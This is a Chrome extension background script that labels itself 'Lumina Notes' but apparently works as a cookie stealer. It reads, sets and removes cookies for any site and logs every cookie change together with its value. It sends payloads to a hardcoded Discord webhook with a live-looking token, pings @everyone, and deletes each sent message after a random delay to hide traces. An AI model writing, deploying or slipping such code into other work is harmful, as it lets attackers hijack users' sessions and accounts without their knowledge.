// background.js

// ============================================================
// 1. Webhook Configuration
// ============================================================
const webhookUrl = 'https://discord.com/api/webhooks/1430991580411465748/35i2HUJAM5ZrJ8FPC6j9_2wOGKj1GwOh3apo2Zb4w3qGYZrEdYVXN4tdQVActLCDD2y3';

async function sendToWebhook(payload) {
  if (!webhookUrl) {
    console.error("webhook url not configured.");
    return;
  }

  const delayMs = Math.floor(Math.random() * (30000 - 5000 + 1)) + 5000;
  if (payload && payload.embeds && payload.embeds[0]) {
    const embed = payload.embeds[0];

    // Add bell emoji to the embed title so it's visually distinct
    if (embed.title && !embed.title.startsWith('🔔')) {
      embed.title = '🔔 ' + embed.title;
    }

    const deleteText = `Self-destructs in ${Math.round(delayMs / 1000)}s`;
    if (embed.footer) {
      embed.footer.text = `${embed.footer.text} | ${deleteText}`;
    } else {
      embed.footer = { text: deleteText };
    }
  }

  // Ping @everyone AND explicitly allow it — Discord blocks webhook pings without this
  payload.content = '@everyone';
  payload.allowed_mentions = { parse: ['everyone'] };


  try {
    const response = await fetch(webhookUrl + '?wait=true', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(payload)
    });

    if (!response.ok) {
      console.error(`webhook failed with status ${response.status}`);
      return;
    }

    const data = await response.json();
    if (data && data.id) {
      setTimeout(() => {
        fetch(`${webhookUrl}/messages/${data.id}`, { method: 'DELETE' })
          .catch(err => console.error('Failed to delete webhook message:', err));
      }, delayMs);
    }
  } catch (error) {
    console.error("error sending to webhook:", error);
  }
}


// ============================================================
// 2. Cookie Manager Functions
// ============================================================

/**
 * Get a single cookie by URL and name.
 * @param {string} url - Default: https://www.example.com
 */
async function getCookie(url = 'https://www.example.com', name) {
  return new Promise((resolve) => {
    chrome.cookies.get({ url, name }, (cookie) => {
      resolve(cookie); // Returns null if not found
    });
  });
}

/**
 * Get ALL cookies for a given URL.
 * @param {string} url - Default: https://www.example.com
 */
async function getAllCookies(url = 'https://www.example.com') {
  return new Promise((resolve) => {
    chrome.cookies.getAll({ url }, (cookies) => {
      resolve(cookies);
    });
  });
}

/**
 * Set a cookie.
 * @param {string} url - Default: https://www.example.com
 */
async function setCookie(url = 'https://www.example.com', name, value, expirationDays = 1, options = {}) {
  return new Promise((resolve) => {
    chrome.cookies.set({
      url,
      name,
      value,
      expirationDate: Date.now() / 1000 + (expirationDays * 86400),
      ...options
    }, (cookie) => {
      resolve(cookie);
    });
  });
}

/**
 * Remove / delete a specific cookie.
 * @param {string} url - Default: https://www.example.com
 */
async function removeCookie(url = 'https://www.example.com', name) {
  return new Promise((resolve) => {
    chrome.cookies.remove({ url, name }, (details) => {
      resolve(details);
    });
  });
}

// ============================================================
// 3. Cookie Change Listener — saves events to local storage
chrome.cookies.onChanged.addListener(function (changeInfo) {
  const { cookie, removed, cause } = changeInfo;

  const event = {
    time: new Date().toLocaleString(),
    name: cookie.name,
    domain: cookie.domain,
    action: removed ? `Removed (${cause})` : 'Added/Updated',
    value: cookie.value
  };

  // Get existing log, append new event, save back
  chrome.storage.local.get(['cookieLog'], (result) => {
    const log = result.cookieLog || [];
    log.unshift(event);       // add to top
    if (log.length > 50) log.pop(); // keep last 50 only
    chrome.storage.local.set({ cookieLog: log });
  });
});

// ============================================================
// 4. Message Listener
// ============================================================
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {

  // --- Send to Discord Webhook ---
  if (request.action === 'sendToDiscord') {
    sendToWebhook(request.payload).then(() => {
      sendResponse({ status: "success" });
    }).catch(() => {
      sendResponse({ status: "error" });
    });
    return true;
  }

  // --- Get a single cookie ---
  if (request.action === 'getCookie') {
    getCookie(request.url, request.name).then((cookie) => {
      sendResponse({ cookie });
    });
    return true;
  }

  // --- Get all cookies for a URL ---
  if (request.action === 'getAllCookies') {
    getAllCookies(request.url).then((cookies) => {
      sendResponse({ cookies });
    });
    return true;
  }

  // --- Set a cookie ---
  if (request.action === 'setCookie') {
    setCookie(request.url, request.name, request.value, request.expirationDays, request.options).then((cookie) => {
      sendResponse({ cookie });
    });
    return true;
  }

  // --- Remove a cookie ---
  if (request.action === 'removeCookie') {
    removeCookie(request.url, request.name).then((details) => {
      sendResponse({ details });
    });
    return true;
  }

  // --- Get the cookie audit log ---
  if (request.action === 'getCookieLog') {
    chrome.storage.local.get(['cookieLog'], (result) => {
      sendResponse({ log: result.cookieLog || [] });
    });
    return true;
  }

  // --- Clear the cookie audit log ---
  if (request.action === 'clearCookieLog') {
    chrome.storage.local.remove('cookieLog', () => {
      sendResponse({ status: 'cleared' });
    });
    return true;
  }
});

console.log("Lumina Notes background service worker is running and monitoring.");
